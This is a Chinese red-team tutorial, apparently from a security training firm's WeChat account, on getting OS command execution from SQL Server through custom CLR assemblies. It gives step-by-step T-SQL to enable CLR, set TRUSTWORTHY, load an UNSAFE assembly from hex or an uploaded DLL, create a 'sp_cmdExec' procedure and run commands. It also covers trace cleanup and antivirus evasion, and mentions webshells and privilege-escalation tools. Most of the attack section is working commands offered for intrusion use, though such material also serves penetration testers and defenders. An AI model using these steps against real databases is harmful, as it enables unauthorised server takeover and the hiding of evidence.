> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KFniCQMJ0ApCW68CqecIaQ)

本文作者是 i 春秋线下就业班结业学员「YongYe」分享的技术文章，公众号旨在为大家提供更多的学习方法与技能技巧，文章仅供学习参考。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd4V2kgb6UN7s9V6ogxsv2u0zS0yPLIvAg5Q9Jx4zFsKxye8ksQgXNXXvXrrY11zWCl4wicskCIXQ0A/640?wx_fmt=jpeg)

YongYe

  

i 春秋渗透测试工程师成都基地线下就业班 10 期结业学员。通过推荐就业，已成功拿到 Offer 并顺利入职，目前担任红队渗透测试工程师，擅长黑盒测试。

  

![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWia5te5wMdlKF9EotqjvnTh7KrNCMdaT67jSPzfRia16dew7xVEanQE0jZOEgvCmNjrh793sBwV8zcg/640?wx_fmt=png)

  

YongYe：现在 MSSQL 数据库中使用最多的命令执行手段就是 xp_cmdshell，但在环境出现问题，例如 xp、sp 无法使用时，就会让人感到无措。相比之下，CLR 技术更加先进，操作面更广，可以更好地解决此类问题。

CLR 提供了一种在 SQL Server 中运行托管代码的方法，这种代码可以用多种编程语言编写，如 C#、VB.NET 等。通过 CLR，我们可以执行更多的任务，解决更多的问题，为数据库管理提供更多的便利。希望通过本文分享，你将学会程序集的生成方法，并 DIY 自己的程序集。

  

**一、XP_CmdShell 与 CLR 简单对比**

<table cellspacing="0"><tbody><tr><td width="168" valign="top" align="center"><p><strong>对比方向<o:p></o:p><o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p><strong>XP_CmdShell<o:p></o:p><o:p></o:p></strong></p></td><td width="173.33333333333334" valign="top" align="center"><p><strong>CLR<o:p></o:p><o:p></o:p></strong></p></td></tr><tr><td width="148.33333333333334" valign="top" align="center"><p><strong>命令实现<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>扩展存储过程<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>CLR 存储过程或函数<o:p></o:p></p></td></tr><tr><td width="148.33333333333334" valign="top" align="center"><p><strong>参数解析<o:p></o:p><o:p></o:p></strong></p></td><td width="154.33333333333334" valign="top" align="center"><p>简单参数<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>支持复杂参数<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>返回数据<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>简单文本<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>复杂数据类型<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>性能<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>中等，约原生代码的 50%<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>接近原生代码，几乎无额外开销<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>线程使用<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>单线程，不支持多线程<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>支持多线程执行<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>资源控制<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>仅内存控制<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>内存及 CPU 资源可控<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>扩展语言<o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p>仅 T-SQL<o:p></o:p></p></td><td width="173.33333333333334" valign="top" align="center"><p>支持各种 CLR 语言<o:p></o:p></p></td></tr><tr><td width="168" valign="top" align="center"><p><strong>总结<o:p></o:p><o:p></o:p><o:p></o:p></strong></p></td><td width="174.33333333333334" valign="top" align="center"><p><strong>简单易用<o:p></o:p></strong></p></td><td width="173.33333333333334" valign="top" align="center"><p><strong>操作面更广<o:p></o:p></strong></p></td></tr></tbody></table>

**二、CLR 介绍**

从 SQL Server 2005 开始，SQL Server 集成了用于 Microsoft Windows 的. NET Framework 的公共语言运行时 (CLR) 组件。CLR(Common Language Runtime)：公共语言运行时是微软推出的. NET Framework 的运行时执行环境, 它提供了一系列功能来支持. NET 程序的运行：

（1）内存管理：CLR 自动进行内存分配、垃圾回收等内存管理工作。

（2）类型安全：CLR 确保所有对象使用前都正确分配内存和初始化。

（3）错误处理：CLR 可以捕捉管理代码运行时出现的系统级错误。

（4）代码访问安全性：CLR 执行代码时会进行权限检查，确保代码只能访问它应该访问的资源。

（5）线程管理：CLR 创建线程、进行同步和控制线程的执行。

（6）对齐编程语言：不同语言编译成中间语言 IL 后，由 CLR 执行，使它们能相互操作。

（7）代码部署：CLR 负责把代码编译为本机代码，也进行反射提供运行时类型信息。

这些特点使得 CLR 非常的强大！利用方式也是非常的多。

**三、环境条件**

SQL 版本：SQL Server 2008 R2_默认配置

测试系统：Win10

CLR 编写：Visual Studio 2022

利用条件：sysadmin

**四、创建自已的程序集**

可以使用网上公开现成的程序集，也可以自已做一个程序集。

1、测试了一下还是 Visual Studio 方便点，只需要安装最下面数据库操作工具即可。安装完新建一个 SQL Server 数据库项目。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjrwXpia4KqVeo8d64Oe2VeUzSPVXApa8Zrnk1cBbu9SacPcoVh9IG1qw/640?wx_fmt=png)

2、配置一下目标的 SQL Sserver 版本。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjRoJYXUlXcDaMhXOLbFSKfux1VBSzWt20oMWzeXQ840505LkmMVRsIA/640?wx_fmt=png)

3、下拉配置一下框架版本，我本机测试直接看的控制面板。实战获取版本也比较方便，冰蝎、哥斯拉连上去都已经搜集好了。

**Tips：**版本不匹配容易出现问题，程序集无效等。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjFkvia6d9R39a7eSSNqp8XPtkRn1umfD0eZLlvwK0bvAz2CKa5WatWeA/640?wx_fmt=png)

4、新建 SQL CLR 存储过程

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjjy8T1HDP3hqbzNIJn3dsB50mj8B20LX22Nz1wKPkKHdZnw1XBjOYYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjKwKbbnyUg1GnhOJANjDf1ZEm8aQ4ian0qlOGpMqoXp4xBicha5mxiaQcQ/640?wx_fmt=png)

5、这就是代码模板了，大家自由发挥。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjGprzxibPRvEUBHBrecU1meEY4P1sO3Xb0Ad4mIgibRKxyDgJNhbTkn6A/640?wx_fmt=png)

6、编写完生成，程序集就做完了。程序集路径在下面：

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd4V2kgb6UN7s9V6ogxsv2u0R6Efg3L9g9RiaWe7xZNbVibVUwYicS4JEm4jrJKXEd9egOOGBBbtYWkRQ/640?wx_fmt=jpeg)

进入程序集 \ bin\Release\，这两个文件是有用的。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjaNEoRSyH3jjzLITTfo3J7XZzibfjaESQYBNz8VhwMr8tfllyaGzUHuQ/640?wx_fmt=png)

（1）Database1.dll 文件可用于存在上传点的情况，可以直接上传。记得改名字，不然就上传一个 shell.asp。（不推荐该方式：文件直接落地 + 需要上传点）

（2）Database1_Create.sql 文件找到”CREATE ASSEMBLY” 这行，这就是我们生成的十六进制程序集。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrj7cEM71luasstZLMruFniaWwKjJj2G8YBDsOTnIZBkianCWBgPeKOTkZg/640?wx_fmt=png)

**五、利用流程**

1、查看 CLR 是否开启，看看有没有前辈已经弄好了。（1=ON、0=OFF）

```
SELECT * FROM sys.configurations WHERE name ='clr enabled'

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjO59L0Sc0nVtHuest2F9QDFYRiaMicUbu5OkHC5RO28EsPFSY6FahvZVQ/640?wx_fmt=png)

2、通过 sp_configure 开启 CLR 功能。

```
exec sp_configure 'show advanced options', 1;
RECONFIGURE;
Exec sp_configure 'clr enabled', 1;
RECONFIGURE;

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjx27Bop4Bruu7ibDibSX1PngZzj9cnTiaJI1wuyzpZ8HZhyMKlHX2hAG4Q/640?wx_fmt=png)

3、如果提示导入不安全程序集 / 权限等相关问题，尝试以下命令。允许 master 数据库中的所有 CLR 程序集不受限制地执行，忽略普通的权限检查。master 默认为 ON，其它数据库默认 OFF。

```
ALTER DATABASE [master] SET TRUSTWORTHY ON;

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjgCfFaTOvYQVWbVveLGSxfiaRBVabAf6WovDIRZESJ2AgrV3ReD25taA/640?wx_fmt=png)

执行以下命令可查询是否设置成功。

```
SELECT is_trustworthy_on FROM sys.databases WHERE name='master'

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjqAxOx02NzvvqVXia4cspib5IAp24UqCviahdStdxEl8hkm9xxDuicIS3rw/640?wx_fmt=png)

4、导入我们的程序集，这里有两种方式可以导入，就是之前生成的两个文件：通过 16 进制导入和通过 dll 文件导入。

**方式 1：通过 16 进制的 CLR 导入**

直接从 Database1_Create.sql 中复制粘贴即可。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjRiaBdbaF0DosAODXY8r6bSLNu1Evy7JCaQg2OWQ5wMXdnVklRC4dkDg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjkWFzicKicOs2gWt4BL4ncVcWJHtYmK4BggJlmxsKwDmZYwKOTxQ0GKrw/640?wx_fmt=png)

**方式 2：通过程序集. dll 文件导入**

通过其它漏洞上传 dll 文件，执行以下命令导入指定位置的 dll。

```
CREATE ASSEMBLY sp_cmdExec FROM ' C:\Users\admin\source\repos\Database1\Database1\bin\Release\Database1.dll' WITH PERMISSION_SET = UNSAFE

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjtX8wNcPhBSq2eTFX77LC3Il0PQGxMaIPaVvAb2J2Bt153CiblsoUDEA/640?wx_fmt=png)

**Tips：**

(1) 方式 2 中因为 dll 直接落地，文件会直接被杀软拦截。使用 Visual Studio 生成程序集都会被直接拦截了。

(2) 方式 2 中 sp_cmdExec 为程序集名称，这里不改后面也不要改，不然就会报错。

**5、创建存储过程**

方式 1 导入，这样执行。红色部分根据实际程序集内容更改，不然会报错。

```
CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjOGf2gdRwAxoZc7UJbvK6XfRYUFnHBbff0ucRSIZMJXgsjmibPniandXQ/640?wx_fmt=png)

方式 2 导入，这样执行。否则会报错找不到 xxxxxxx。

```
CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME sp_cmdExec.StoredProcedures.ExecCommand;

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjOGf2gdRwAxoZc7UJbvK6XfRYUFnHBbff0ucRSIZMJXgsjmibPniandXQ/640?wx_fmt=png)

这是我的程序集，可以参考一下。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd4V2kgb6UN7s9V6ogxsv2u0icDSpagfhI3qyGXomnPOnj1OWDlZ6BfNic45LmuoOH2KskWswes5BEYw/640?wx_fmt=jpeg)

**Tips：**WarSQLKit 为程序集的名称。

**6、命令执行**

```
EXEC sp_cmdExec 'whoami';

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrj3sgh1s9mBkLfIy0NNLfbFNWc0he7GWZPfVfxkYL2kg1spJsfvazLyA/640?wx_fmt=png)

**7、简单痕迹清理**

**查询创建的程序集：**SELECT * FROM sys.assemblies

**删除程序集：**DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjm53RrsicPHXD7Qibtibq0Gia8sMJ4flWicDXGcSB1LvRibp89hnrR3Xd4EYA/640?wx_fmt=png)

**关闭 CLR**

```
EXEC sp_configure 'clr enabled', 0
RECONFIGURE WITH OVERRIDE

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd5NTgm4RHpyrV29NCuiaezrjqicYKKCfHwPIZEJwkz9beF9A8KlfqMXpTZZIibCw7ub8IrLOfZQQsrng/640?wx_fmt=png)

**六、总结**

整个流程，不上传 dll 文件。我的某 rong 很安静。利用的话网上有很多自动化工具，工具虽然被杀。但是不影响操作，正常肯定代理出来远程连接即可。使用工具自动提权（我的某 rong 反正是很安静)，即使存在杀软拦截也有其它办法。因为 CLR 程序集可以编程，所以你可以做很多事情包括不限于自动化工具已经实现的功能。

工具推荐：WarSQLKit（功能强大 / 兼容性存在问题）、SharpSQLTools（简单易用）

![](https://mmbiz.qpic.cn/mmbiz_png/bL2iaicTYdZn4m5le0kRVm9SCWEZuSXF7OZST3SzhrAufDZ0GmlbficqzCFDopFPvoLkyI5toFcjlBIDVYHnhibLicg/640?wx_fmt=png)

以上内容来自于「YongYe」师傅投稿，也欢迎更多安全少侠加入 “**春秋豪杰排行榜**” 计划，成为 i 春秋的签约作家，通过贡献知识力量，为网络安全行业注入更强大的学习能量。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd7icmLLCZ8CuYFTECMHZUQTsnFLLwzEyRiaInt9OznyIJNphghIdIlEaf2NriajUrrDCrofaic3dZ2kpA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn6ibMqibiaZnldj1OWicNIewouicSQdWxN9PRrUhiccxQksoO55hEicibSHV5SrXtb2rVc464Ix45iaxico1xaw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**成为签约作家，您将获得以下丰厚福利：**

![](https://mmbiz.qpic.cn/mmbiz_png/bL2iaicTYdZn4ug4DppMh2oyJnXqQp8xlRkRcAib6yhkIXDOjNQseWDrr3JyseLwEHXvw5cx6ISVG6xxUVibld7G1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**01**

**高额稿费回报：**您的每一篇作品都将得到公平合理的稿费报酬，让您的辛勤创作得到实质性的回报。

**02**

**i 春秋签约作家聘书：**这不仅是一份荣誉，更是对您实力的高度认可，让您在同行中脱颖而出，为您的职业生涯添上一抹重彩。

**03**

**专属定制好礼：**我们会依据排行榜的排名，提供 i 春秋专属定制好礼，让您感受到我们的诚意和尊重。

**04**

**行业峰会入门券：**您将有机会亲临行业盛会，与安全领域的专家和行业领袖面对面交流，深入探讨学术前沿技术，接触到最新的行业动态和技术趋势。

**05**

**拓宽人脉：**i 春秋将为您提供一个分享和交流学术研究成果的平台，让您与同行们共同探讨行业新技术，结识更多技术大牛。

**「春秋豪杰排行榜」****投稿方式：**

1、在 i 春秋论坛（bbs.ichunqiu.com）发布原创技术文章，文章链接通过微信（VX: h0XT0nh0u）发给工作人员，并备注：投稿。

2、无论文章是否通过审核，3 个工作日内都会得到工作人员的告知。若未完成专业爱好者认证，可先联系工作人员进行认证。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd5vIpn4s4AwztIaRDzOWGU08ERQsibf7h4WnSMtXyqN8NxAOSrMvravu0KUJB5HQfKjicHMFeQ6LZgQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

（认证过程遇到问题，请联系客服）

![](https://mmbiz.qpic.cn/mmbiz_png/bL2iaicTYdZn4m5le0kRVm9SCWEZuSXF7OZST3SzhrAufDZ0GmlbficqzCFDopFPvoLkyI5toFcjlBIDVYHnhibLicg/640?wx_fmt=png)

「YongYe」师傅是成都基地线下就业班 10 期结业学员，该班结业率达到 99%，结业学员通过考试获得国家 CISAW-Web 安全认证证书人员达到 100%。i 春秋为每一位顺利结业的学员推荐合适的就业机会，通过推荐就业到 360、知道创宇、天融信、启明星辰、58、滴滴、公安部、金源动力等企业，就业率达到 93%。

如果你也对渗透测试感兴趣，想在网络安全行业立足，毕业就能拿到过万的薪资，欢迎了解渗透测试工程师线下就业班，现在报名还能享受[**暑期优惠福利**](http://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247522861&idx=1&sn=0c1f6bf715346911eaa7d6cabc91bb16&chksm=fafcd6facd8b5fec453535a9746230ab5e2eff1771a218b0d5305c74cd73c5ce285c9698a468&scene=21#wechat_redirect)，点击下方图片可查看具体活动详情 >>

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd4V2kgb6UN7s9V6ogxsv2u0bnzM9nypXodQrIzGzytXSWNAlefe8b1WLcib8sjEc8ia03VSnaclxIWw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247522861&idx=1&sn=0c1f6bf715346911eaa7d6cabc91bb16&chksm=fafcd6facd8b5fec453535a9746230ab5e2eff1771a218b0d5305c74cd73c5ce285c9698a468&scene=21#wechat_redirect)